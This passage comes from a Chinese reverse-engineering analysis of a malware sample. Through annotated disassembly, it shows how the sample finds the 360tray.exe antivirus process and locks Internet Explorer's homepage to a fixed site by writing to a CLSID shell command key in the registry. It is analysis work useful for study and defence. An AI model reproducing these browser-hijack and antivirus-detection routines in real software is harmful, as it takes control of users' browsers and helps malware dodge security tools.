
### 9、查找 `IEXPLORE.EXE` 锁定主页为 `http://www.rom12580.cn`

`HKEY_CLASSES_ROOTCLSID\{871C5380-42A0-1069-A2EA-08002B30309D}\shell\OpenHomePage\Command`

代码：

```
00404389   /$  55               PUSH EBP
0040438A   |.  8BEC             MOV EBP,ESP
0040438C   |.  81EC 30020000    SUB ESP,230
00404392   |.  53               PUSH EBX
00404393   |.  33DB             XOR EBX,EBX
00404395   |.  53               PUSH EBX                             ; /ProcessID = 0
00404396   |.  6A 02            PUSH 2                                ; |Flags = TH32CS_SNAPPROCESS
00404398   |.  E8 5BD4FFFF      CALL <JMP.&KERNEL32.CreateToolhelp32Snap>; \CreateToolhelp32Snapshot
0040439D   |.  8D8D D4FEFFFF    LEA ECX,DWORD PTR SS:[EBP-12C]
004043A3   |.  8945 FC          MOV DWORD PTR SS:[EBP-4],EAX
004043A6   |.  51               PUSH ECX                              ; /pProcessentry
004043A7   |.  50               PUSH EAX                              ; |hSnapshot
004043A8   |.  C785 D4FEFFFF>   MOV DWORD PTR SS:[EBP-12C],128        ; |
004043B2   |.  E8 3BD4FFFF      CALL <JMP.&KERNEL32.Process32First>   ; \Process32First
004043B7   |.  85C0             TEST EAX,EAX
004043B9   |.  74 70            JE SHORT 复件_123.0040442B
004043BB   |.  56               PUSH ESI
004043BC   |.  8B35 50504000    MOV ESI,DWORD PTR DS:[<&KERNEL32.OutputD>;  kernel32.OutputDebugStringA
004043C2   |.  57               PUSH EDI
004043C3   |.  BF F0E34300      MOV EDI,复件_123.0043E3F0             ;  ASCII "Find 360 Process"
004043C8   |>  8D85 F8FEFFFF    /LEA EAX,DWORD PTR SS:[EBP-108]
004043CE   |.  68 E4E34300      |PUSH 复件_123.0043E3E4               ; /s2 = "360tray.exe"
004043D3   |.  50               |PUSH EAX                              ; |s1
004043D4   |.  FF15 88514000    |CALL DWORD PTR DS:[<&MSVCRT.strstr>]  ; \strstr
004043DA   |.  59               |POP ECX
004043DB   |.  85C0             |TEST EAX,EAX
004043DD   |.  59               |POP ECX
004043DE   |.  75 18            |JNZ SHORT 复件_123.004043F8
004043E0   |.  8D85 F8FEFFFF    |LEA EAX,DWORD PTR SS:[EBP-108]
004043E6   |.  68 D8E34300      |PUSH 复件_123.0043E3D8               ; /s2 = "360TRAY.EXE"
004043EB   |.  50               |PUSH EAX                              ; |s1
004043EC   |.  FF15 88514000    |CALL DWORD PTR DS:[<&MSVCRT.strstr>]  ; \strstr
004043F2   |.  59               |POP ECX
004043F3   |.  85C0             |TEST EAX,EAX
004043F5   |.  59               |POP ECX
004043F6   |.  74 1E            |JE SHORT 复件_123.00404416
004043F8   |>  8D85 F8FEFFFF    |LEA EAX,DWORD PTR SS:[EBP-108]
004043FE   |.  50               |PUSH EAX                              ; /src
004043FF   |.  8D85 D0FDFFFF    |LEA EAX,DWORD PTR SS:[EBP-230]        ; |
00404405   |.  50               |PUSH EAX                              ; |dest
00404406   |.  E8 C7D1FFFF      |CALL <JMP.&MSVCRT.strcpy>             ; \strcpy
0040440B   |.  8B9D DCFEFFFF    |MOV EBX,DWORD PTR SS:[EBP-124]
00404411   |.  59               |POP ECX
00404412   |.  59               |POP ECX
00404413   |.  57               |PUSH EDI
00404414   |.  FFD6             |CALL ESI
00404416   |>  8D85 D4FEFFFF    |LEA EAX,DWORD PTR SS:[EBP-12C]
0040441C   |.  50               |PUSH EAX                              ; /pProcessentry
0040441D   |.  FF75 FC          |PUSH DWORD PTR SS:[EBP-4]             ; |hSnapshot
00404420   |.  E8 C7D3FFFF      |CALL <JMP.&KERNEL32.Process32Next>    ; \Process32Next
00404425   |.  85C0             |TEST EAX,EAX
00404427   |.^ 75 9F            \JNZ SHORT 复件_123.004043C8
00404429   |.  5F               POP EDI
0040442A   |.  5E               POP ESI
0040442B   |>  FF75 FC          PUSH DWORD PTR SS:[EBP-4]             ; /hObject
0040442E   |.  FF15 60504000    CALL DWORD PTR DS:[<&KERNEL32.CloseHandl>; \CloseHandle
00404434   |.  33C0             XOR EAX,EAX
00404436   |.  3BC3             CMP EAX,EBX
00404438   |.  5B               POP EBX
00404439   |.  1BC0             SBB EAX,EAX
0040443B   |.  F7D8             NEG EAX
0040443D   |.  C9               LEAVE
0040443E   \.  C3               RETN
```

### 10、利用注册表锁定 IE 主页 Call 代码

代码：

```
004041DA   /$  B8 20194000    MOV EAX,123.00401920
004041DF   |.  E8 0CD4FFFF     CALL 123.004015F0
004041E4   |.  81EC 14020000  SUB ESP,214
004041EA   |.  56               PUSH ESI
004041EB   |.  8D4D E8          LEA ECX,DWORD PTR SS:[EBP-18]
004041EE   |.  E8 0ACFFFFF     CALL 123.004010FD
004041F3   |.  8365 FC 00       AND DWORD PTR SS:[EBP-4],0
004041F7   |.  BE 04010000     MOV ESI,104
004041FC   |.  8D85 E0FDFFFF   LEA EAX,DWORD PTR SS:[EBP-220]
00404202   |.  56               PUSH ESI                            ; /BufSize = 104 (260.)
00404203   |.  50               PUSH EAX                              ; |Buffer
00404204   |.  FF15 4C504000    CALL DWORD PTR DS:[<&KERNEL32.GetWindows>; \GetWindowsDirectoryA  //获取 windows 系统目录
0040420A   |.  56               PUSH ESI                            ; /n => 104 (260.)
0040420B   |.  8D85 E4FEFFFF    LEA EAX,DWORD PTR SS:[EBP-11C]       ; |
00404211   |.  6A 00            PUSH 0                                ; |c = 00
00404213   |.  50               PUSH EAX                              ; |s
00404214   |.  E8 3BD4FFFF      CALL <JMP.&MSVCRT.memset>             ; \memset
00404219   |.  8A85 E0FDFFFF    MOV AL,BYTE PTR SS:[EBP-220]
0040421F   |.  68 48E34300      PUSH 123.0043E348                     ; /src = ":\Program Files\Internet Explorer\IEXPLORE.EXE"
00404224   |.  8885 E5FEFFFF    MOV BYTE PTR SS:[EBP-11B],AL         ; |
0040422A   |.  8D85 E4FEFFFF    LEA EAX,DWORD PTR SS:[EBP-11C]       ; |
00404230   |.  50               PUSH EAX                              ; |dest
00404231   |.  C685 E4FEFFFF>   MOV BYTE PTR SS:[EBP-11C],22          ; |
00404238   |.  E8 9BD3FFFF      CALL <JMP.&MSVCRT.strcat>             ; \strcat
0040423D   |.  8D85 E4FEFFFF    LEA EAX,DWORD PTR SS:[EBP-11C]
00404243   |.  68 44E34300      PUSH 123.0043E344                     ; /src = ""
00404248   |.  50               PUSH EAX                              ; |dest
00404249   |.  E8 8AD3FFFF      CALL <JMP.&MSVCRT.strcat>             ; \strcat
0040424E   |.  8D85 E4FEFFFF    LEA EAX,DWORD PTR SS:[EBP-11C]
00404254   |.  68 40E34300      PUSH 123.0043E340                     ; /src = "   "
00404259   |.  50               PUSH EAX                              ; |dest
0040425A   |.  E8 79D3FFFF      CALL <JMP.&MSVCRT.strcat>             ; \strcat
0040425F   |.  8D85 E4FEFFFF    LEA EAX,DWORD PTR SS:[EBP-11C]
00404265   |.  68 28E34300      PUSH 123.0043E328                     ; /src = "http://www.rom12580.cn"
0040426A   |.  50               PUSH EAX                              ; |dest
0040426B   |.  E8 68D3FFFF      CALL <JMP.&MSVCRT.strcat>             ; \strcat
00404270   |.  83C4 2C          ADD ESP,2C
00404273   |.  8D4D E8          LEA ECX,DWORD PTR SS:[EBP-18]
00404276   |.  68 E0E24300      PUSH 123.0043E2E0                     ;  ASCII "CLSID\{871C5380-42A0-1069-A2EA-08002B30309D}\shell\OpenHomePage\Command"
0040427B   |.  68 00000080      PUSH 80000000
00404280   |.  E8 E6CEFFFF      CALL 123.0040116B                      //写入到注册表
00404285   |.  85C0             TEST EAX,EAX
00404287   |.  5E               POP ESI
00404288   |.  75 11            JNZ SHORT 123.0040429B
0040428A   |.  8D85 E4FEFFFF    LEA EAX,DWORD PTR SS:[EBP-11C]
00404290   |.  8D4D E8          LEA ECX,DWORD PTR SS:[EBP-18]
00404293   |.  50               PUSH EAX
00404294   |.  6A 00            PUSH 0
00404296   |.  E8 A8DDFFFF      CALL 123.00402043                      //将 IEXPLORE.EXE 后添加 http://www.rom12580.cn
0040429B   |>  834D FC FF       OR DWORD PTR SS:[EBP-4],FFFFFFFF
0040429F   |.  8D4D E8          LEA ECX,DWORD PTR SS:[EBP-18]
004042A2   |.  E8 8BCEFFFF      CALL 123.00401132                      //关闭注册表
004042A7   |.  8B4D F4          MOV ECX,DWORD PTR SS:[EBP-C]
004042AA   |.  64:890D 00000>   MOV DWORD PTR FS:[0],ECX
004042B1   |.  C9               LEAVE
004042B2   \.  C3               RETN
```
